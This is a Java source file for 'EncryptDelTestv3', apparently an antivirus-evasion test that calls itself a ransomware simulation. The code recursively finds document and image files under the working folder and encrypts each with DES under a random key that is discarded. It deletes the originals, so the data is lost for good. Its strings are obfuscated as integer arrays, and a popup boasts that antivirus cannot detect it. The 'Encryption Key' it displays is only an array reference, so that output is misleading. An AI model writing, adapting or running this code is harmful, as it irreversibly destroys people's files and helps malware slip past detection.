import java.util.Scanner;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import java.io.*;
import java.nio.file.StandardCopyOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import javax.swing.*;
import java.awt.event.*;
import javax.swing.*;
import java.awt.*;

import java.net.URI;
import java.awt.Desktop;

public class EncryptDelTestv3 extends JPanel implements ActionListener {
    private static Cipher encrypt;
    private static JTextArea textarea = new JTextArea(40, 60);
    private static JButton button = new JButton("Continue");
    private static final byte[] initialization_vector = {99,11,88,00,55,66,33,22};
    private static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
    private static Date today = new Date();
    public static int encryptedcount;
    
    public EncryptDelTestv3(){
        JFrame frame = new JFrame("EncryptDelTestv3");
        textarea.setFocusable(false);
        textarea.setWrapStyleWord(false);
        textarea.setLineWrap(false);
        Font font = new Font("Courier New", Font.BOLD, 12);
        textarea.setFont(font);
        JScrollPane scrollpane = new JScrollPane(textarea);
        scrollpane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);

        frame.setBounds(3, 3, 3, 3);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().setLayout(new BorderLayout(3, 3));
        frame.getContentPane().add(new JScrollPane(textarea), BorderLayout.CENTER);
        frame.getContentPane().add(button, BorderLayout.SOUTH);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
        button.addActionListener(this);
    } 
    
    public static void main(String[] args) throws IOException, ParseException {
        new EncryptDelTestv3();
        Date expirydate = sdf.parse("2021-1-18");
        System.out.println("");
        int CharNum[] = {91,69,110,99,114,121,112,116,32,68,101,108,101,116,101,32,84,101,115,116,32,118,51,32,40,74,97,118,97,41,93};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{83,105,109,117,108,97,116,101,32,114,97,110,115,111,109,119,97,114,101,32,101,110,99,114,121,112,116,105,111,110,32,111,112,101,114,97,116,105,111,110};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{66,121,32,69,100,100,105,101,32,67,104,117,32,101,100,100,105,101,99,104,117,46,97,110,100,114,111,105,100,64,103,109,97,105,108,46,99,111,109};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{80,108,101,97,115,101,32,100,111,119,110,108,111,97,100,32,116,104,101,32,111,114,105,103,105,110,97,108,32,97,110,100,32,108,97,116,101,115,116,32,118,101,114,115,105,111,110,32,102,114,111,109};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{103,105,116,104,117,98,46,99,111,109,47,101,100,100,105,101,99,104,117,47,69,110,99,114,121,112,116,45,68,101,108,101,116,101,45,84,101,115,116};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{86,101,114,115,105,111,110,32,118,51,46,48,46,53,32,40,51,48,47,65,117,103,47,50,48,50,49,41};
        textarea.append(NumtoString(CharNum)+"\n");
        textarea.append("\n");
        CharNum = new int[]{84,104,105,115,32,116,111,111,108,32,101,110,99,114,121,112,116,32,116,104,101,32,102,105,108,101,32,117,110,100,101,114,32,99,117,114,114,101,110,116,32,102,111,108,100,101,114,32,97,110,100,32,105,116,39,115,32,115,117,98,102,111,108,100,101,114,40,115,41};
        textarea.append(NumtoString(CharNum)+"\n");
        textarea.append("\n");
        CharNum = new int[]{91,67,97,117,116,105,111,110,93};
        textarea.append(NumtoString(CharNum)+"\n");
        CharNum = new int[]{89,111,117,32,117,115,101,32,116,104,105,115,32,116,111,111,108,32,99,111,109,112,108,101,116,101,108,121,32,97,116,32,121,111,117,114,32,111,119,110,32,114,105,115,107,46};
        textarea.append(NumtoString(CharNum)+"\n");
        textarea.append("\n");
        CharNum = new int[]{80,108,101,97,115,101,32,99,108,105,99,107,32,34,67,111,110,116,105,110,117,101,34,32,116,111,32,112,114,111,99,101,101,100};
        textarea.append(NumtoString(CharNum)+"\n");
        textarea.setCaretPosition(textarea.getDocument().getLength());
    }

    public static void goProcess() {
        textarea.append("\n");
        System.out.println("");
        File currentDir = new File("."); 
        displayDirectoryContents(currentDir);
        try {
           BufferedWriter out = new BufferedWriter(new FileWriter("popup.html"));
           int CharNum[] = {60,104,116,109,108,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,104,101,97,100,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,116,105,116,108,101,62,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,51,60,47,116,105,116,108,101,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,98,111,100,121,32,98,103,99,111,108,111,114,61,114,101,100,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,60,98,62,91,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,51,32,40,74,97,118,97,41,93,60,47,98,62,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62,60,98,114,62,60,98,114,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,84,104,97,110,107,115,32,102,111,114,32,121,111,117,114,32,116,101,115,116,33,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,60,117,62,67,65,78,78,79,84,60,47,117,62,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
           out.write(NumtoString(CharNum)+"\n");
           out.write("<br>\n");
           out.write("<br>\n");
           CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
           out.write(NumtoString(CharNum) + initialization_vector + "\n");
           CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
           out.write(NumtoString(CharNum) + encryptedcount + "\n");
           out.write("<br>" + sdf.format(today) + "\n");
           out.write("<br>\n");
           CharNum = new int[]{60,47,98,111,100,121,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,47,104,116,109,108,62};
           out.write(NumtoString(CharNum)+"\n");
           out.close();
        }
        catch (IOException e) {
        }        

        textarea.append("\n");
        System.out.println("");
        
        if (encryptedcount > 0){
          java.awt.Desktop desktop = java.awt.Desktop.getDesktop();
          if( desktop.isSupported( java.awt.Desktop.Action.BROWSE ) ) {
              try {
                java.net.URI uri = new java.net.URI("popup.html");
                desktop.browse( uri );
              }
              catch ( Exception e ) {
                System.err.println( e.getMessage() );
              }
          }
          int CharNum[] = {69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
          textarea.append(NumtoString(CharNum) + initialization_vector + "\n");
          System.out.println(NumtoString(CharNum) + initialization_vector);
          CharNum = new int[]{69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
          textarea.append(NumtoString(CharNum) + encryptedcount + "\n");
          System.out.println(NumtoString(CharNum) + encryptedcount );
          textarea.setForeground(Color.RED);
          CharNum = new int[]{89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,67,65,78,78,79,84,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116};
          textarea.append(NumtoString(CharNum) + "\n");      
          CharNum = new int[]{69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
          System.out.println(NumtoString(CharNum));          
        } else {
          int CharNum[] = {78,111,32,102,105,108,101,32,105,115,32,102,111,117,110,100,32,111,114,32,101,110,99,114,121,112,116,101,100};
          textarea.append(NumtoString(CharNum) + "\n");      
          System.out.println(NumtoString(CharNum));
        }
        textarea.setCaretPosition(textarea.getDocument().getLength());
        JFrame f;  
        f=new JFrame();  
        if (encryptedcount > 0){
          int CharNum[] = {89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,67,65,78,78,79,84,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116,33};
          JOptionPane.showMessageDialog(f,NumtoString(CharNum),"EncryptDelTestv3",JOptionPane.ERROR_MESSAGE);
        }
    }
    
    public static void displayDirectoryContents(File dir) {
      try {
              File[] files = dir.listFiles();
              for (File file: files) {
                  if (file.isDirectory()) {
                      displayDirectoryContents(file);
                  } else {
                      if (file.getCanonicalPath().toLowerCase().endsWith(".doc") || file.getCanonicalPath().toLowerCase().endsWith(".docx")  || file.getCanonicalPath().toLowerCase().endsWith(".xls") || file.getCanonicalPath().toLowerCase().endsWith(".xlsx") || file.getCanonicalPath().toLowerCase().endsWith(".txt") || file.getCanonicalPath().toLowerCase().endsWith(".rtf") || file.getCanonicalPath().toLowerCase().endsWith(".pdf") || file.getCanonicalPath().toLowerCase().endsWith(".jpg") || file.getCanonicalPath().toLowerCase().endsWith(".jpeg") || file.getCanonicalPath().toLowerCase().endsWith(".gif") || file.getCanonicalPath().toLowerCase().endsWith(".bmp") || file.getCanonicalPath().toLowerCase().endsWith(".png")){
                          System.out.println(file.getCanonicalPath());
                          textarea.append(file.getCanonicalPath()+"\n");
                          JavaDESEncryption(file.getCanonicalPath());
                      }
                  }
              }
          } catch (IOException e) {
              e.printStackTrace();
          }
    }
    
    public static String NumtoString(int[] NumArray){
        String str = "";
        for (int i: NumArray) {
            str += Character.toString((char) i);
        }
        return str;
    }

    public static void JavaDESEncryption(String filename) {
        int CharNum[] = {101,110,99,114,121,112,116};
        String clearFile = filename;
        String encryptedFile = filename + "." + NumtoString(CharNum) + "ed";

        try {

            SecretKey secret_key = KeyGenerator.getInstance("DES").generateKey();
            AlgorithmParameterSpec alogrithm_specs = new IvParameterSpec(initialization_vector);

            encrypt = Cipher.getInstance("DES/CBC/PKCS5Padding");
            encrypt.init(Cipher.ENCRYPT_MODE, secret_key, alogrithm_specs);

            textarea.append(NumtoString(CharNum) + " to " + encryptedFile + "\n");
            System.out.println(NumtoString(CharNum) + " to " + encryptedFile);            
            encrypt(new FileInputStream(clearFile), new FileOutputStream(encryptedFile));
            encryptedcount = encryptedcount + 1;
            CharNum = new int[]{111,118,101,114,119,114,105,116,101,32};
            textarea.append(NumtoString(CharNum) + clearFile + "\n");
            System.out.println(NumtoString(CharNum) + clearFile);            
            File file = new File(clearFile);
            Path pathencryptedFile = Paths.get(encryptedFile);
            Path pathclearFile = Paths.get(clearFile);
            Files.copy(pathencryptedFile, pathclearFile, StandardCopyOption.REPLACE_EXISTING);
            file.delete();

            CharNum = new int[]{100,101,108,101,116,101,32};
            textarea.append(NumtoString(CharNum) + clearFile + "\n");
            System.out.println(NumtoString(CharNum) + clearFile);
            CharNum = new int[]{118,101,114,105,102,121,32};
            textarea.append(NumtoString(CharNum) + clearFile + " ... ");
            System.out.print(NumtoString(CharNum) + clearFile + " ... ");            
            File f = new File(clearFile);
            if (f.exists() && f.isFile()) {
                textarea.append("(exist)\n");
                System.out.println("(exist)");                
            } else {
                textarea.append("(not exist)\n");
                System.out.println("(not exist)");
            }
            textarea.append("\n");
            System.out.println("");
            
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | IOException e) {
            e.printStackTrace();
        }

    }

    private static void encrypt(InputStream input, OutputStream output)
    throws IOException {

        output = new CipherOutputStream(output, encrypt);
        writeBytes(input, output);
    }

    private static void writeBytes(InputStream input, OutputStream output)
    throws IOException {
        byte[] writeBuffer = new byte[512];
        int readBytes = 0;

        while ((readBytes = input.read(writeBuffer)) >= 0) {
            output.write(writeBuffer, 0, readBytes);
        }

        output.close();
        input.close();
    }

    @Override
    public void actionPerformed(ActionEvent e){
        button.setEnabled(false); 
        goProcess();
    }
    
}
